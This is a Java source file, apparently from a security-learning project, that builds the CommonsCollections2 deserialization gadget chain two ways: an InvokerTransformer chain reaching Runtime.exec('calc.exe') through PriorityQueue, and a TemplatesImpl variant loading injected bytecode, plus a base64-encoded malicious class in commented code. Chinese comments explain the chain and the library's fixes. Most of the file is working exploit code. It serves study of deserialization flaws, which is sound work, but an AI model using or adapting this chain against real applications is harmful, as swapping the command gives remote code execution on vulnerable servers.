package com.madaha.codesecone.controller.AdvancedAttack.deserialize.CommonCollections;

// 以下是使用的CC1的3.1-3.2.1版本，本次测试直接使用的CommonsCollections3.2.1，不满足CC2的利用条件。
//import org.apache.commons.collections.Transformer;
//import org.apache.commons.collections.comparators.TransformingComparator;
//import org.apache.commons.collections.functors.ChainedTransformer;
//import org.apache.commons.collections.functors.ConstantTransformer;
//import org.apache.commons.collections.functors.InvokerTransformer;


/**
 * 此处分析一下cc2：
 *    1、cc2和cc4这两条和之前CC1的不太一样，因为之前的环境是CommonsCollections3.1版本的利用链；
 *    2、commons-collections官方为了修复一些架构上的问题推出了commons-collections4。
 *    3、两者的包名不一样，可以在同一个项目上同时包含commons-collections和commons-collections4。
 *    4、ysoserial官方也推出了2条commons-collections4专属的利用链也就是cc2和cc4。
 */
/**
 * Apache Commons Collections官⽅是如何修复反序列化漏洞的？
 *    1、Apache Commons Collections官⽅在2015年底得知序列化相关的问题后，就在两个分⽀上同时发布了新的版本，4.1和3.2.2。
 *    2、在3.2.2中新版代码中增加了⼀个⽅法FunctorUtils#checkUnsafeSerialization ，⽤于检测反序列化是否安全。
 *       如果开发者没有设置全局配置org.apache.commons.collections.enableUnsafeSerialization=true ，即默认情况下会抛出异常。
 *    3、在4.1中，这⼏个危险Transformer类不再实现Serializable 接⼝，也就是说，他们⼏个彻底⽆法序列化和反序列化了。
 */

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.ibatis.javassist.ClassPool;
import org.apache.ibatis.javassist.CtClass;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.Comparator;
import java.util.PriorityQueue;


public class CommonCollections2 {

    public static void main(String[] args) throws Exception{
        CC2_PriorityQueue();
//        CC2_TemplatesImpl();
    }

    public static void CC2_PriorityQueue() throws Exception{
        Transformer[] fakeTransformers = new Transformer[]{
                new ConstantTransformer(1)
        };

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(1),
        };

        Transformer faketransformerchain =  new ChainedTransformer(fakeTransformers);
        TransformingComparator comparator = new TransformingComparator(faketransformerchain);
        PriorityQueue queue = new PriorityQueue(2, comparator);

        queue.add(1);
        queue.add(1);

        // Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
        // field.setAccessible(true);
        // field.set(faketransformerchain, transformers);
        Reflections.setFieldValue(faketransformerchain, "iTransformers", transformers);


        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        // System.out.println(barr);
        // System.out.println("-----------------------------------------------------------------------");

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();
        // System.out.println(o.toString());
    }

    public static void CC2_TemplatesImpl() throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(TemplatesImpl_CC2.class.getName());
        TemplatesImpl obj = new TemplatesImpl();
        Reflections.setFieldValue(obj, "_bytecodes", new byte[][]{clazz.toBytecode()});
        Reflections.setFieldValue(obj, "_name", "TemplatesImpl_CC2");
        Reflections.setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer("toString", null, null);
        Comparator comparator = new TransformingComparator(transformer);
        PriorityQueue queue = new PriorityQueue(2, comparator);

        queue.add(1);
        queue.add(1);

        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
        Reflections.setFieldValue(queue, "queue", new Object[]{obj, obj});


        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        // System.out.println(barr);
        // System.out.println("-----------------------------------------------------------------------");

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();
        // System.out.println(o.toString());
    }



    // CC2_PriorityQueue
//    public static void main(String[] args) throws Exception{
//
//        //构造恶意数组
//        Transformer[] transformers = new Transformer[]{
//                new ConstantTransformer(Runtime.class),
//                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",new Class[]{}}),
//                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null,new Object[]{}}),
//                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
//        };
//        //构造无害数组
//        Transformer[] test = new Transformer[]{};
//
//        //在执行add方法 调用compare 方法进行比较的时候使用无害的数组
//        ChainedTransformer chain = new ChainedTransformer(test);
//
//        PriorityQueue queue = new PriorityQueue(new TransformingComparator(chain));
//        queue.add(1);
//        queue.add(1);
//
//        //在调用完add 方法后通过反射修改 chain的数组，将无害数组替换成恶意数组，之后反序列化的初始化二叉堆的时候调用恶意数组执行代码
//        Field field = chain.getClass().getDeclaredField("iTransformers");
//        field.setAccessible(true);
//        field.set(chain,transformers);
//
//
//        ByteArrayOutputStream barr = new ByteArrayOutputStream();
//        ObjectOutputStream oos = new ObjectOutputStream(barr);
//        oos.writeObject(queue);
//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
//        ois.readObject();
//    }


    // CC2_TemplatesImpl
//    public static void main(String[] args) throws Exception{
//        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAbAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBAA1jb2RlVGVzdC5qYXZhDAAHAAgHABwMAB0AHgEABGNhbGMMAB8AIAEAH2NvbS9odWF3ZWkvQ2xhc3NMb2FkZXIvY29kZVRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAALAAQADAANAA0ACwAAAAQAAQAMAAEADQAOAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAARAAsAAAAEAAEADwABAA0AEAACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAFQALAAAABAABAA8AAQARAAAAAgAS");
//        TemplatesImpl obj = new TemplatesImpl();
//        setFieldValue(obj, "_bytecodes", new byte[][]{code});
//        setFieldValue(obj, "_name", "test");
//        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
//
//        //创建⼀个⼈畜⽆害的InvokerTransformer 对象，并⽤它实例化Comparator
//        Transformer transformer = new InvokerTransformer("toString", null, null);
//        Comparator comparator = new TransformingComparator(transformer);
//
//        //实例化PriorityQueue 对象，第⼀个参数是初始化时的⼤⼩，⾄少需要2个元素才会触发排序和⽐较，所以是2；第⼆个参数是⽐较时的Comparator，传⼊前⾯实例化的comparator
//        PriorityQueue queue = new PriorityQueue(2,comparator);
//
//        //如何为了我们调试的时候避免发生命令执行，往里面加入两个无用的值。
//        queue.add(1);
//        queue.add(1);
//
//        //最后，将真正的恶意Transformer设置上
//        setFieldValue(transformer, "iMethodName", "newTransformer");
//
//        //反射获取queue对象中queue的参数强转赋值给queueArray，并且修改其中的值为我们实际的TemplatesImpl对象。
////        Field queuefield = queue.getClass().getDeclaredField("queue");
////        queuefield.setAccessible(true);
////        Object[] queueArray = (Object[]) queuefield.get(queue);
////        queueArray[0] = obj;
////        queueArray[1] = 1;
//        setFieldValue(queue, "queue", new Object[]{obj, obj});
//
//
//        ByteArrayOutputStream barr = new ByteArrayOutputStream();
//        ObjectOutputStream oos = new ObjectOutputStream(barr);
//        oos.writeObject(queue);
//        oos.close();
//        System.out.println(barr);
//        System.out.println("-----------------------------------------------------------------------");
//
//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
//        Object o = (Object) ois.readObject();
//        System.out.println(o.toString());
//    }
//
//    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
//        Field field = obj.getClass().getDeclaredField(fieldName);
//        field.setAccessible(true);
//        field.set(obj, value);
//    }
}
